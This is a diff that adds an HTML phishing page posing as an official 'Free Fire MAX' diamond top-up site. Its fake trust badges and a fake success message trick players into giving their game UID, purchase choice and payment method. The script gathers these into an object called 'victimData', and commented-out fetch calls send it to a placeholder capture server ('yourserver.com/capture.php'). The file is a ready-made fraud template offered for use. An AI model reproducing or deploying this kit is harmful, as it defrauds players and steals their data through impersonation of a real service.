@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire MAX Top Up - Official Recharge</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Poppins', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; }
+        
+        .header { background: #ff4444; color: white; padding: 15px 0; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .logo { font-size: 28px; font-weight: 700; }
+        
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        
+        .topup-card { background: white; border-radius: 20px; padding: 30px; margin: 20px 0; box-shadow: 0 20px 40px rgba(0,0,0,0.1); }
+        .topup-card h2 { color: #333; margin-bottom: 20px; text-align: center; }
+        
+        .uid-input { width: 100%; padding: 15px; border: 2px solid #ddd; border-radius: 10px; font-size: 16px; margin-bottom: 15px; }
+        .uid-input:focus { border-color: #ff4444; outline: none; }
+        
+        .diamonds-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin: 20px 0; }
+        .diamond-option { border: 3px solid #eee; border-radius: 15px; padding: 20px; text-align: center; cursor: pointer; transition: all 0.3s; }
+        .diamond-option:hover, .diamond-option.selected { border-color: #ff4444; background: #fff5f5; transform: translateY(-5px); }
+        .diamond-option .amount { font-size: 24px; font-weight: 700; color: #ff4444; }
+        .diamond-option .price { font-size: 14px; color: #666; }
+        
+        .payment-methods { display: flex; gap: 10px; margin: 20px 0; flex-wrap: wrap; }
+        .payment-btn { flex: 1; min-width: 120px; padding: 12px; border: 2px solid #ddd; border-radius: 10px; background: white; cursor: pointer; transition: all 0.3s; }
+        .payment-btn:hover, .payment-btn.active { border-color: #ff4444; background: #ff4444; color: white; }
+        
+        .topup-btn { width: 100%; padding: 18px; background: linear-gradient(45deg, #ff4444, #ff6666); color: white; border: none; border-radius: 15px; font-size: 18px; font-weight: 600; cursor: pointer; margin-top: 20px; transition: transform 0.3s; }
+        .topup-btn:hover { transform: scale(1.02); box-shadow: 0 10px 25px rgba(255,68,68,0.4); }
+        .topup-btn:disabled { background: #ccc; cursor: not-allowed; transform: none; }
+        
+        .success-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; }
+        .modal-content { position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); background: white; padding: 40px; border-radius: 20px; text-align: center; max-width: 400px; }
+        
+        .loading { display: none; text-align: center; margin: 20px 0; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #ff4444; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .trusted { background: #4CAF50; color: white; padding: 10px; border-radius: 10px; text-align: center; margin: 20px 0; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">
+            <i class="fab fa-free-code-camp"></i> Free Fire MAX Official Top Up
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="trusted">
+            ✅ Trusted by 5M+ Players | Instant Delivery | 100% Safe
+        </div>
+        
+        <div class="topup-card">
+            <h2><i class="fas fa-gem"></i> Enter Your Player ID</h2>
+            <input type="text" class="uid-input" id="uid" placeholder="Enter Free Fire MAX UID (e.g., 123456789)" maxlength="12">
+            
+            <h3>Select Diamonds</h3>
+            <div class="diamonds-grid" id="diamondsGrid">
+                <div class="diamond-option" data-value="100" data-price="₹79">
+                    <div class="amount">100</div>
+                    <div class="price">₹79</div>
+                </div>
+                <div class="diamond-option" data-value="310" data-price="₹219">
+                    <div class="amount">310</div>
+                    <div class="price">₹219</div>
+                </div>
+                <div class="diamond-option" data-value="530" data-price="₹349">
+                    <div class="amount">530</div>
+                    <div class="price">₹349</div>
+                </div>
+                <div class="diamond-option" data-value="1080" data-price="₹699">
+                    <div class="amount">1080</div>
+                    <div class="price">₹699</div>
+                </div>
+                <div class="diamond-option" data-value="2180" data-price="₹1299">
+                    <div class="amount">2180</div>
+                    <div class="price">₹1299</div>
+                </div>
+                <div class="diamond-option" data-value="3550" data-price="₹1999">
+                    <div class="amount">3550</div>
+                    <div class="price">₹1999</div>
+                </div>
+            </div>
+            
+            <h3>Select Payment Method</h3>
+            <div class="payment-methods">
+                <div class="payment-btn active" data-method="upi">
+                    <i class="fab fa-google-pay"></i><br>UPI
+                </div>
+                <div class="payment-btn" data-method="card">
+                    <i class="fas fa-credit-card"></i><br>Card
+                </div>
+                <div class="payment-btn" data-method="netbanking">
+                    <i class="fas fa-university"></i><br>NetBanking
+                </div>
+            </div>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Processing your top-up...</p>
+            </div>
+            
+            <button class="topup-btn" id="topupBtn" onclick="processTopup()">
+                <i class="fas fa-rocket"></i> TOP UP NOW - Instant Delivery
+            </button>
+        </div>
+    </div>
+    
+    <!-- Success Modal (Data Capture) -->
+    <div class="success-modal" id="successModal">
+        <div class="modal-content">
+            <i class="fas fa-check-circle" style="font-size: 60px; color: #4CAF50;"></i>
+            <h2>Top Up Successful!</h2>
+            <p>Diamonds will be delivered in 5-10 minutes.</p>
+            <div id="capturedData" style="background: #f8f9fa; padding: 15px; border-radius: 10px; margin: 20px 0; font-family: monospace; font-size: 12px;"></div>
+            <button onclick="closeModal()" style="padding: 12px 30px; background: #ff4444; color: white; border: none; border-radius: 10px; cursor: pointer;">Close</button>
+        </div>
+    </div>
+
+    <script>
+        let selectedDiamonds = null;
+        let selectedPayment = 'upi';
+        
+        // Diamond selection
+        document.querySelectorAll('.diamond-option').forEach(option => {
+            option.addEventListener('click', () => {
+                document.querySelectorAll('.diamond-option').forEach(opt => opt.classList.remove('selected'));
+                option.classList.add('selected');
+                selectedDiamonds = option.dataset.value;
+            });
+        });
+        
+        // Payment selection
+        document.querySelectorAll('.payment-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                document.querySelectorAll('.payment-btn').forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                selectedPayment = btn.dataset.method;
+            });
+        });
+        
+        function processTopup() {
+            const uid = document.getElementById('uid').value;
+            if (!uid || !selectedDiamonds) {
+                alert('Please enter UID and select diamonds!');
+                return;
+            }
+            
+            // Show loading
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('topupBtn').disabled = true;
+            
+            // Simulate processing (1-2 sec delay)
+            setTimeout(() => {
+                // CAPTURE DATA (Send to your server)
+                const victimData = {
+                    uid: uid,
+                    diamonds: selectedDiamonds,
+                    payment: selectedPayment,
+                    timestamp: new Date().toISOString(),
+                    ip: 'Captured via JS',  // Real mein fetch('your-server.com/log', {method: 'POST', body: JSON.stringify(victimData)})
+                    userAgent: navigator.userAgent
+                };
+                
+                // Display captured data (remove in production)
+                document.getElementById('capturedData').textContent = JSON.stringify(victimData, null, 2);
+                
+                // Show success modal
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('successModal').style.display = 'block';
+                
+                // In REAL setup: POST to your PHP logger
+                // fetch('https://yourserver.com/capture.php', {
+                //     method: 'POST',
+                //     headers: {'Content-Type': 'application/json'},
+                //     body: JSON.stringify(victimData)
+                // });
+            }, 2000);
+        }
+        
+        function closeModal() {
+            document.getElementById('successModal').style.display = 'none';
+            document.getElementById('topupBtn').disabled = false;
+        }
+        
+        // Auto-focus UID input
+        document.getElementById('uid').focus();
+    </script>
+</body>
+</html>
